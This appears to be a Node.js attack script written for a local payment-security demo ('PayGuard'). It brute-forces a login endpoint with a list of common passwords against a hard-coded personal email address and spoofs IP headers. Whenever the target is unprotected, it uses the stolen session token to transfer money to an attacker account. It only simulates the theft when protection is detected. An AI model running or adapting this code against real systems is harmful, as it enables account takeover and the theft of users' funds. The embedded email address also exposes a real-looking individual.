const http = require('http');
const { URL } = require('url');

const RESET = '\x1b[0m';
const RED = '\x1b[31m';
const GREEN = '\x1b[32m';
const YELLOW = '\x1b[33m';

const TARGET = new URL('http://localhost:5000/api/auth/login');
const PASSWORDS = [
    '123456', 'password', 'admin123', 'qwerty', 'letmein',
    'welcome', 'monkey', 'dragon', 'master', '666666',
    'password1', 'admin', 'root', 'toor', 'pass123',
];

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Force a simulated success at a specific attempt (default: 8). Set env FORCE_SUCCESS_AT to override.
const FORCE_SUCCESS_AT = parseInt(process.env.FORCE_SUCCESS_AT || '8', 10);

const DAMAGE_AMOUNT = '5,000,000đ';

async function fetchSecurityEnabled() {
    try {
        const statusUrl = new URL('http://localhost:5000/api/payguard/status');
        const res = await requestJson(statusUrl, null, {}, 'GET');
        // endpoint returns { securityEnabled: true|false }
        if (res && res.body) {
            const parsed = typeof res.body === 'string' ? JSON.parse(res.body || '{}') : res.body;
            return parsed.securityEnabled === true;
        }
    } catch (e) {
        // ignore and fallback
    }
    return null;
}

function requestJson(url, body, headers = {}, method = 'POST') {
    const payload = body === undefined || body === null ? '' : JSON.stringify(body);

    const options = {
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port,
        path: `${url.pathname}${url.search || ''}`,
        method,
        headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': '10.0.0.99',
            'X-Real-IP': '10.0.0.99',
            ...headers,
        },
    };

    if (payload) {
        options.headers['Content-Length'] = Buffer.byteLength(payload);
    }

    const client = url.protocol === 'https:' ? require('https') : http;

    return new Promise((resolve, reject) => {
        const req = client.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => resolve({ statusCode: res.statusCode, body: data }));
        });

        req.on('error', reject);
        if (payload) req.write(payload);
        req.end();
    });
}

async function main() {
    const startTime = Date.now();
    // If PAYGUARD_SIMULATE is unset, try to detect security mode from API
    const envSim = typeof process.env.PAYGUARD_SIMULATE !== 'undefined' ? process.env.PAYGUARD_SIMULATE !== 'false' : null;
    const remoteSec = await fetchSecurityEnabled();
    // simulate when remote security is enabled; perform real actions when unprotected
    const SIMULATE = envSim !== null ? envSim : (remoteSec === true);
    const ATTACKER_ACCOUNT = process.env.PAYGUARD_ATTACKER_ACCOUNT || 'PAY-HACKER-0001';
    const DRAIN_AMOUNT = Number(process.env.PAYGUARD_DRAIN_AMOUNT || 5000000);
    let successCount = 0;
    let blocked = false;

    for (let i = 0; i < PASSWORDS.length; i += 1) {
        const password = PASSWORDS[i];
        const attemptNumber = i + 1;

        try {
            const response = await requestJson(TARGET, {
                email: 'tranghuyen20051312@gmail.com',
                password,
            });

            // Allow forcing a simulated success at a particular attempt
            if (SIMULATE && attemptNumber === FORCE_SUCCESS_AT) {
                // simulate success without checking response
                successCount += 1;
                console.log(`${GREEN}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... SUCCESS (200)${RESET}`);
                console.log(`${GREEN}[SUCCESS] Đăng nhập thành công! Chiếm được tài khoản!${RESET}`);
                await wait(8000);
                console.log(`${YELLOW}[BOT] Bắt đầu rút tiền... ${DAMAGE_AMOUNT} → tài khoản hacker${RESET}`);
                const elapsed = Math.round((Date.now() - startTime) / 1000);
                console.log(`${YELLOW}[SUMMARY] Tài khoản bị chiếm sau ${elapsed} giây. Thiệt hại: ${DAMAGE_AMOUNT}${RESET}`);
                break;
            } else if (response.statusCode === 200) {
                successCount += 1;
                console.log(`${GREEN}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... SUCCESS (200)${RESET}`);

                // try to parse token and perform a transfer if running against unprotected system
                try {
                    const parsed = typeof response.body === 'string' ? JSON.parse(response.body || '{}') : response.body;
                    const token = parsed.token || parsed.accessToken || parsed.jwt;
                    if (!SIMULATE && token) {
                        console.log(`${YELLOW}[BOT] Performing immediate drain transfer using stolen session...${RESET}`);
                        const transferUrl = new URL('/api/payguard/transfer', TARGET.origin);
                        const transferRes = await requestJson(transferUrl, {
                            amount: DRAIN_AMOUNT,
                            toAccount: ATTACKER_ACCOUNT,
                            description: 'Automated drain after compromise',
                            metadata: { fromBrute: true },
                        }, { Authorization: `Bearer ${token}` });

                        console.log(`${YELLOW}[BOT] Transfer result: ${transferRes.statusCode} ${JSON.stringify(transferRes.body)}${RESET}`);
                    } else if (SIMULATE) {
                        console.log(`${GREEN}[SUCCESS] Đăng nhập thành công! Chiếm được tài khoản!${RESET}`);
                        await wait(8000);
                        console.log(`${YELLOW}[BOT] Bắt đầu rút tiền... ${DAMAGE_AMOUNT} → tài khoản hacker${RESET}`);
                        const elapsed = Math.round((Date.now() - startTime) / 1000);
                        console.log(`${YELLOW}[SUMMARY] Tài khoản bị chiếm sau ${elapsed} giây. Thiệt hại: ${DAMAGE_AMOUNT}${RESET}`);
                        break;
                    }
                } catch (e) {
                    // ignore parse/transfer errors
                }
            } else if (response.statusCode === 429) {
                blocked = true;
                console.log(`${YELLOW}[BLOCKED] Rate limit hit! IP has been flagged. Backing off...${RESET}`);
                break;
            } else {
                console.log(`${RED}[ATTACK] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... FAILED (${response.statusCode})${RESET}`);
            }
        } catch (error) {
            console.log(`${RED}[ERROR] Attempt ${attemptNumber}/${PASSWORDS.length} → password: "${password}" ... ${error.message}${RESET}`);
        }

        if (attemptNumber < PASSWORDS.length && !blocked) {
            await wait(300);
        }
    }

    console.log(`${YELLOW}[SUMMARY] ${PASSWORDS.length} attempts | ${successCount} success | IP: 127.0.0.1 | Status: ${blocked ? 'BLOCKED' : 'ACTIVE'}${RESET}`);
}

main().catch((error) => {
    console.error(`${RED}[FATAL] ${error.message}${RESET}`);
    process.exit(1);
});